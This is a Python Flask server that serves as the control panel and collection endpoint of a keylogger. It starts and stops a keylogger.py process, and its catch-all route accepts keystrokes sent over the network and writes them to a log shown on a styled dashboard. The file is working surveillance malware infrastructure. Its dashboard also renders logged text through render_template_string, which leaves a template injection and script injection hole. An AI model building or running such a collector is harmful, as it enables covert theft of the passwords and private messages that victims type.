from flask import Flask, request, render_template_string, redirect, url_for
from threading import Thread
import subprocess
import os
import time

app = Flask(__name__)
LOG_FILE = "keystrokes.log"
keylogger_process = None

@app.route("/favicon.ico")
def favicon():
    return "", 204

@app.route("/")
def home():
    return redirect(url_for('dashboard'))

@app.route("/dashboard")
def dashboard():
    try:
        with open(LOG_FILE, "r") as file:
            logs = file.readlines()
    except FileNotFoundError:
        logs = []

    log_entries = "".join(
        f"<div class='log-entry'>{line.strip()}</div>" for line in logs
    )

    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Keylogger Dashboard</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background-color: #0f172a;
                color: #f1f5f9;
                margin: 0;
                padding: 20px;
            }}
            h1 {{
                text-align: center;
                color: #38bdf8;
            }}
            .log-box {{
                background-color: #1e293b;
                border-radius: 8px;
                padding: 20px;
                max-height: 60vh;
                overflow-y: auto;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
                margin-bottom: 30px;
            }}
            .log-entry {{
                border-bottom: 1px solid #334155;
                padding: 10px 0;
                font-family: monospace;
            }}
            .log-entry:last-child {{
                border-bottom: none;
            }}
            .buttons {{
                display: flex;
                justify-content: center;
                gap: 20px;
            }}
            .btn {{
                padding: 10px 20px;
                border: none;
                border-radius: 6px;
                font-size: 16px;
                cursor: pointer;
                transition: background 0.2s ease;
            }}
            .start-btn {{
                background-color: #22c55e;
                color: #fff;
            }}
            .start-btn:hover {{
                background-color: #16a34a;
            }}
            .stop-btn {{
                background-color: #ef4444;
                color: #fff;
            }}
            .stop-btn:hover {{
                background-color: #dc2626;
            }}
            .clear-btn {{
                background-color: #facc15;
                color: #000;
            }}
            .clear-btn:hover {{
                background-color: #eab308;
            }}
        </style>
    </head>
    <body>
        <h1>Keylogger Dashboard</h1>
        <div class="log-box">{log_entries if log_entries else "<i>No keystrokes logged yet.</i>"}</div>
        <div class="buttons">
            <button class="btn start-btn" onclick="window.location.href='/start'">Start</button>
            <button class="btn stop-btn" onclick="window.location.href='/stop'">Stop</button>
            <button class="btn clear-btn" onclick="window.location.href='/clear'">Clear Logs</button>
        </div>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route("/start")
def start_keylogger():
    global keylogger_process
    if keylogger_process is None or keylogger_process.poll() is not None:
        keylogger_process = subprocess.Popen(["python", "keylogger.py"])
    return redirect(url_for('dashboard'))

@app.route("/stop")
def stop_keylogger():
    global keylogger_process
    if keylogger_process and keylogger_process.poll() is None:
        keylogger_process.terminate()
        keylogger_process = None
    return redirect(url_for('dashboard'))

@app.route("/clear")
def clear_log():
    open(LOG_FILE, "w").close()  # just clears the contents
    return redirect("/dashboard")


@app.route("/<txt>")
def capture_keystroke(txt):
    if txt.lower() == "favicon.ico":
        return "", 204

    with open(LOG_FILE, "a") as file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"{timestamp} - {txt}\n")
    
    return "ok"

def run_flask():
    app.run("0.0.0.0", 1344)

if __name__ == "__main__":
    run_flask()
